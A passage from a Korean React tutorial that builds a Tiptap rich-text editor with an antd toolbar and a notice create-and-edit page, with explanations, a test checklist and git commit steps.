import TextAlign from "@tiptap/extension-text-align";
import { TextStyleKit } from "@tiptap/extension-text-style";
import { Button, ColorPicker, Divider, Select, Tooltip } from "antd";
import {
  AlignCenterOutlined,
  AlignLeftOutlined,
  AlignRightOutlined,
  BoldOutlined,
  ClearOutlined,
  FontColorsOutlined,
  HighlightOutlined,
  ItalicOutlined,
  LinkOutlined,
  OrderedListOutlined,
  RedoOutlined,
  StrikethroughOutlined,
  UnderlineOutlined,
  UndoOutlined,
  UnorderedListOutlined,
} from "@ant-design/icons";
import styles from "@/shared/ui/RichText.module.css";

const COLORS = [
  "#000000",
  "#595959",
  "#f5222d",
  "#fa8c16",
  "#fadb14",
  "#52c41a",
  "#1677ff",
  "#722ed1",
];
const FONT_SIZES = ["12px", "14px", "16px", "20px", "24px", "32px"];

interface ToolButtonProps {
  title: string;
  icon: ReactNode;
  active?: boolean;
  disabled?: boolean;
  onClick: () => void;
}

// 툴바 버튼 하나. 켜져 있으면(active) 색이 채워진다.
function ToolButton({ title, icon, active, disabled, onClick }: ToolButtonProps) {
  return (
    <Tooltip title={title}>
      <Button
        size="small"
        color="primary"
        variant={active ? "filled" : "text"}
        icon={icon}
        disabled={disabled}
        onClick={onClick}
      />
    </Tooltip>
  );
}

function Toolbar({ editor }: { editor: Editor }) {
  const { t } = useTranslation("editor");

  // 커서가 움직이거나 내용이 바뀔 때마다, 툴바에 필요한 상태만 골라서 다시 그린다.
  const state = useEditorState({
    editor,
    selector: ({ editor: current }) => ({
      bold: current.isActive("bold"),
      italic: current.isActive("italic"),
      underline: current.isActive("underline"),
      strike: current.isActive("strike"),
      bulletList: current.isActive("bulletList"),
      orderedList: current.isActive("orderedList"),
      link: current.isActive("link"),
      block: current.isActive("heading", { level: 2 })
        ? "h2"
        : current.isActive("heading", { level: 3 })
          ? "h3"
          : "p",
      align:
        (["center", "right"] as const).find((value) => current.isActive({ textAlign: value })) ??
        "left",
      color: current.getAttributes("textStyle").color as string | undefined,
      background: current.getAttributes("textStyle").backgroundColor as string | undefined,
      fontSize: current.getAttributes("textStyle").fontSize as string | undefined,
      canUndo: current.can().undo(),
      canRedo: current.can().redo(),
    }),
  });

  // 모든 명령은 chain().focus()로 시작한다. 툴바를 누르는 순간 에디터에서 빠져나간 커서를 되돌려 놓기 위해서다.
  const chain = () => editor.chain().focus();

  const editLink = () => {
    // 간단히 브라우저 prompt를 쓴다. 필요하면 antd Modal로 바꾼다.
    const previous = editor.getAttributes("link").href as string | undefined;
    const href = window.prompt(t("linkPrompt"), previous ?? "https://");
    if (href === null) return; // 취소
    if (href === "") chain().unsetLink().run();
    else chain().setLink({ href }).run();
  };

  return (
    <div className={styles.toolbar}>
      <Select
        size="small"
        style={{ width: 96 }}
        value={state.block}
        onChange={(value) => {
          if (value === "p") chain().setParagraph().run();
          else
            chain()
              .toggleHeading({ level: value === "h2" ? 2 : 3 })
              .run();
        }}
        options={[
          { value: "p", label: t("paragraph") },
          { value: "h2", label: t("heading2") },
          { value: "h3", label: t("heading3") },
        ]}
      />
      <Select
        size="small"
        style={{ width: 84 }}
        placeholder={t("fontSize")}
        allowClear
        value={state.fontSize}
        onChange={(value?: string) =>
          value ? chain().setFontSize(value).run() : chain().unsetFontSize().run()
        }
        options={FONT_SIZES.map((size) => ({ value: size, label: size }))}
      />
      <Divider orientation="vertical" />
      <ToolButton
        title={t("bold")}
        icon={<BoldOutlined />}
        active={state.bold}
        onClick={() => chain().toggleBold().run()}
      />
      <ToolButton
        title={t("italic")}
        icon={<ItalicOutlined />}
        active={state.italic}
        onClick={() => chain().toggleItalic().run()}
      />
      <ToolButton
        title={t("underline")}
        icon={<UnderlineOutlined />}
        active={state.underline}
        onClick={() => chain().toggleUnderline().run()}
      />
      <ToolButton
        title={t("strike")}
        icon={<StrikethroughOutlined />}
        active={state.strike}
        onClick={() => chain().toggleStrike().run()}
      />
      <ColorPicker
        size="small"
        allowClear
        presets={[{ label: t("color"), colors: COLORS }]}
        value={state.color ?? null}
        onChangeComplete={(color) => chain().setColor(color.toHexString()).run()}
        onClear={() => chain().unsetColor().run()}
      >
        <span>
          <ToolButton
            title={t("color")}
            icon={<FontColorsOutlined style={{ color: state.color }} />}
            onClick={() => undefined}
          />
        </span>
      </ColorPicker>
      <ColorPicker
        size="small"
        allowClear
        presets={[{ label: t("background"), colors: COLORS }]}
        value={state.background ?? null}
        onChangeComplete={(color) => chain().setBackgroundColor(color.toHexString()).run()}
        onClear={() => chain().unsetBackgroundColor().run()}
      >
        <span>
          <ToolButton
            title={t("background")}
            icon={<HighlightOutlined style={{ color: state.background }} />}
            onClick={() => undefined}
          />
        </span>
      </ColorPicker>
      <Divider orientation="vertical" />
      <ToolButton
        title={t("alignLeft")}
        icon={<AlignLeftOutlined />}
        active={state.align === "left"}
        onClick={() => chain().setTextAlign("left").run()}
      />
      <ToolButton
        title={t("alignCenter")}
        icon={<AlignCenterOutlined />}
        active={state.align === "center"}
        onClick={() => chain().setTextAlign("center").run()}
      />
      <ToolButton
        title={t("alignRight")}
        icon={<AlignRightOutlined />}
        active={state.align === "right"}
        onClick={() => chain().setTextAlign("right").run()}
      />
      <Divider orientation="vertical" />
      <ToolButton
        title={t("bulletList")}
        icon={<UnorderedListOutlined />}
        active={state.bulletList}
        onClick={() => chain().toggleBulletList().run()}
      />
      <ToolButton
        title={t("orderedList")}
        icon={<OrderedListOutlined />}
        active={state.orderedList}
        onClick={() => chain().toggleOrderedList().run()}
      />
      <ToolButton
        title={t("link")}
        icon={<LinkOutlined />}
        active={state.link}
        onClick={editLink}
      />
      <ToolButton
        title={t("clear")}
        icon={<ClearOutlined />}
        onClick={() => chain().unsetAllMarks().clearNodes().run()}
      />
      <Divider orientation="vertical" />
      <ToolButton
        title={t("undo")}
        icon={<UndoOutlined />}
        disabled={!state.canUndo}
        onClick={() => chain().undo().run()}
      />
      <ToolButton
        title={t("redo")}
        icon={<RedoOutlined />}
        disabled={!state.canRedo}
        onClick={() => chain().redo().run()}
      />
    </div>
  );
}

interface RichTextEditorProps {
  value?: string; // HTML. antd Form.Item이 넣어 준다
  onChange?: (html: string) => void; // antd Form.Item이 넣어 준다
}

/** 서식 편집기. antd Form.Item 안에 넣으면 일반 입력칸처럼 동작한다. */
function RichTextEditor({ value, onChange }: RichTextEditorProps) {
  // 에디터는 처음 한 번만 만들어진다. 그때의 onChange를 계속 붙잡고 있지 않도록 최신 함수를 ref에 둔다.
  const onChangeRef = useRef(onChange);
  useEffect(() => {
    onChangeRef.current = onChange;
  });

  const editor = useEditor({
    extensions: [
      StarterKit,
      TextStyleKit,
      TextAlign.configure({ types: ["heading", "paragraph"] }),
    ],
    content: value ?? "",
    // 내용이 바뀌면 HTML을 폼에 알린다. 빈 문서("<p></p>")는 빈 문자열로 보내서 필수 검사가 동작하게 한다.
    onUpdate: ({ editor: current }) =>
      onChangeRef.current?.(current.isEmpty ? "" : current.getHTML()),
  });

  // 폼 값이 밖에서 바뀌면(초기화 등) 에디터 내용을 맞춘다. 같으면 아무것도 하지 않는다. (커서가 튀지 않게)
  useEffect(() => {
    const current = editor.isEmpty ? "" : editor.getHTML();
    if ((value ?? "") !== current) editor.commands.setContent(value ?? "", { emitUpdate: false });
  }, [editor, value]);

  return (
    <div className={styles.editor}>
      <Toolbar editor={editor} />
      <EditorContent editor={editor} className={styles.content} />
    </div>
  );
}

export default RichTextEditor;
```

### 코드 읽어 보기

**`useEditorState`의 selector**: Zustand의 selector와 같은 아이디어입니다. 에디터는 글자 하나 칠 때마다 상태가 바뀌는데, 툴바는 **고른 값이 바뀔 때만** 다시 그려집니다.

**`onChangeRef`**: `useEditor`는 에디터를 **한 번만** 만듭니다. 그때 넘긴 `onUpdate` 함수는 처음 렌더의 `onChange`를 기억하고 있습니다.
최신 `onChange`를 ref에 계속 갱신해 두고, `onUpdate`는 ref를 통해 부르면 항상 최신 함수가 불립니다. 외부 라이브러리 콜백에서 자주 쓰는 기법입니다.

**`setContent(..., { emitUpdate: false })`**: 밖에서 넣은 값으로 바꿀 때는 `onUpdate`를 일으키지 않습니다. 안 그러면 "폼 → 에디터 → 폼 → 에디터..."로 무한히 주고받을 수 있습니다.

**ColorPicker 안의 `<span>`**: antd 팝업 컴포넌트는 자식 요소에 이벤트를 붙여서 열립니다. 우리 `ToolButton`처럼 함수 컴포넌트를 바로 넣으면 이벤트가 전달되지 않을 수 있어서 `span`으로 한 번 감쌉니다.

✅ **커밋**

```powershell
git add .
git commit -m "feat: 서식 편집기 컴포넌트 추가"
```

---

## Step 11-4. 공지 작성·수정 화면

> 🎯 **할 일**: 서식 편집기로 공지를 쓰고, 저장하면 작성 탭이 닫히고 상세 탭이 열리게 합니다. 작성 중에 탭을 닫으려 하면 확인을 받습니다.

### 흐름

```
목록 [글쓰기] → 탭 "공지사항 작성" (NOTICE_EDIT)
상세 [수정]   → 탭 "수정 - 제목"    (NOTICE_EDIT?id=3)
   입력하면 → 탭 제목 앞에 ● (useTabDirty)
   [저장]   → 작성 탭 닫기(확인 없이) → 상세 탭 열기 → 목록·상세 캐시 무효화로 최신 내용 표시
```

### 따라 하기

📄 **`src/features/notice/pages/NoticeEditPage.tsx`** (새 파일)

```tsx
import { useState } from "react";
import { useTranslation } from "react-i18next";
import { App, Button, Card, Flex, Form, Input, Switch } from "antd";
import { useNotice, useSaveNotice } from "@/features/notice/api/queries";
import type { NoticeInput } from "@/features/notice/types";
import { showApiError } from "@/shared/api/showApiError";
import { usePermission } from "@/shared/auth/usePermission";
import CodeRadio from "@/shared/codes/CodeRadio";
import { usePage } from "@/shared/page/PageContext";
import { useClosePage } from "@/shared/page/useClosePage";
import { useOpenPage } from "@/shared/page/useOpenPage";
import { usePageTitle } from "@/shared/page/usePageTitle";
import { useTabDirty } from "@/shared/tabs/useTabDirty";
import { applyServerErrors } from "@/shared/ui/applyServerErrors";
import PageContainer from "@/shared/ui/PageContainer";
import PageLoading from "@/shared/ui/PageLoading";
import RichTextEditor from "@/shared/ui/RichTextEditor";

function NoticeEditPage() {
  const { t } = useTranslation("notice");
  const { message } = App.useApp();
  const { params } = usePage();
  const id = params.id ? Number(params.id) : undefined; // id가 없으면 새 글
  const { data: notice, isPending } = useNotice(id);
  const saveNotice = useSaveNotice();
  const openPage = useOpenPage();
  const closePage = useClosePage();
  const { can } = usePermission("NOTICE"); // 데이터 권한은 공지사항 메뉴 기준
  const [form] = Form.useForm<NoticeInput>();
  const [dirty, setDirty] = useState(false);

  useTabDirty(dirty);
  usePageTitle(notice && t("editTitle", { title: notice.title }));

  // 모든 훅을 부른 다음에 로딩 처리를 한다
  if (id !== undefined && isPending) return <PageLoading />;

  const handleFinish = (input: NoticeInput) => {
    saveNotice.mutate(
      { id, input },
      {
        onSuccess: (saved) => {
          message.success(t("common:message.saved"));
          closePage({ force: true }); // 방금 저장했으니 확인 없이 닫는다
          openPage("NOTICE_VIEW", { id: String(saved.id) });
        },
        onError: (error) => {
          if (!applyServerErrors(form, error)) showApiError(error);
        },
      },
    );
  };

  const required = (field: string) => ({
    required: true,
    message: t("common:validation.required", { field }),
  });

  return (
    <PageContainer>
      <Card>
        <Form
          form={form}
          name={`noticeForm-${id ?? "new"}`}
          layout="vertical"
          initialValues={notice ?? { type: "GENERAL", pinned: false, title: "", content: "" }}
          onValuesChange={() => setDirty(true)}
          onFinish={handleFinish}
        >
          <Flex gap={24} wrap>
            <Form.Item name="type" label={t("field.type")}>
              <CodeRadio group="NOTICE_TYPE" />
            </Form.Item>
            <Form.Item name="pinned" label={t("field.pinned")} valuePropName="checked">
              <Switch />
            </Form.Item>
          </Flex>
          <Form.Item name="title" label={t("field.title")} rules={[required(t("field.title"))]}>
            <Input maxLength={200} showCount />
          </Form.Item>
          <Form.Item
            name="content"
            label={t("field.content")}
            rules={[required(t("field.content"))]}
          >
            <RichTextEditor />
          </Form.Item>
          <Flex justify="end" gap={8}>
            <Button onClick={() => closePage()}>{t("common:button.cancel")}</Button>
            <Button
              type="primary"
              htmlType="submit"
              loading={saveNotice.isPending}
              disabled={!can(id ? "UPDATE" : "CREATE")}
            >
              {t("common:button.save")}
            </Button>
          </Flex>
        </Form>
      </Card>
    </PageContainer>
  );
}

export default NoticeEditPage;
```

### 코드 읽어 보기

**`onValuesChange={() => setDirty(true)}`**: 사용자가 무엇이든 바꾸면 "저장 안 한 변경 있음"이 됩니다. Part 7의 `useTabDirty`가 탭 제목에 ●를 붙이고, 닫을 때 확인을 받습니다.

**`closePage({ force: true })` 다음 `openPage(...)`**: 닫기가 옆 탭으로 이동시키지만, 바로 이어진 `openPage`가 상세 탭으로 다시 이동합니다. 마지막 이동이 이깁니다.

**`name={`noticeForm-${id ?? "new"}`}`**: 수정 탭을 여러 개 열 수 있으므로 폼 이름도 탭마다 다르게 해서 입력칸 id가 겹치지 않게 합니다. (Step 9-1)

**[취소] 버튼은 `closePage()`**: `force` 없이 부르므로 변경이 있으면 확인을 받습니다.

### 확인하기

- [ ] `admin` → 공지사항 → [글쓰기] → 새 탭 "공지사항 작성"
- [ ] 제목을 입력하는 순간 탭 제목 앞에 ●. 탭의 ×를 누르면 "저장하지 않은 변경 내용이 있습니다" 확인
- [ ] 본문에서 글자를 선택하고 글자색을 빨강, 굵게, 크기 20px, 가운데 정렬로 바꿔 봅니다. 툴바 버튼이 눌린 상태로 바뀝니다.
- [ ] 내용 없이 [저장] → "내용 입력은 필수입니다."
- [ ] [저장] → 작성 탭이 닫히고 "공지 - 제목" 상세 탭이 열립니다. 서식이 쓴 그대로 보입니다.
- [ ] 상세에서 [수정] → "수정 - 제목" 탭. 내용을 바꿔 저장하면 열려 있던 상세 탭이 새 내용으로 바뀝니다.
- [ ] `manager`는 글쓰기·수정·삭제가 되고, `user`는 읽기만 됩니다.

✅ **커밋**

```powershell
git add .
git commit -m "feat: 공지사항 작성·수정 화면 추가"
```

---

## 🏁 Part 11을 마치며

| 배운 것                         | 어디서                                      |
| ------------------------------- | ------------------------------------------- |
| 탭으로 상세 열기, 탭 제목 바꾸기 | `useOpenPage`, `usePageTitle`               |
| 저장 후 탭 닫기, 변경 확인       | `useClosePage({ force })`, `useTabDirty`    |
| XSS와 소독                       | `SafeHtml` (DOMPurify)                      |
| 외부 라이브러리를 폼 입력칸으로  | `value` / `onChange`, `onChangeRef`         |
| CSS Modules                      | `RichText.module.css`, `:global()`          |
| 셀에 컴포넌트 그리기             | AG Grid `cellRenderer`                      |

| 증상                                         | 원인과 해결                                                                |
| -------------------------------------------- | -------------------------------------------------------------------------- |
| 상세 화면이 엉뚱한 공지를 보여 준다          | `useSearchParams`를 썼다 → `usePage().params`                              |
| 읽음 요청이 끝없이 나간다                    | `useEffect` 의존성에 mutation 객체를 통째로 넣었다 → `mutate`만 꺼내 쓴다  |
| 에디터에서 글자를 칠 때마다 커서가 맨 끝으로 | 같은 값인데도 `setContent`를 불렀다 → 값이 다를 때만                       |
| 다크 모드에서 본문 글자가 안 보인다          | 본문 스타일에 색을 하드코딩했다 → `var(--app-color-text)`                  |

다음은 Top 영역의 🔔입니다. 읽지 않은 공지와 업무 이벤트를 정해진 사람에게 알립니다. → [Part 12. 알림](part-12-notification.md)
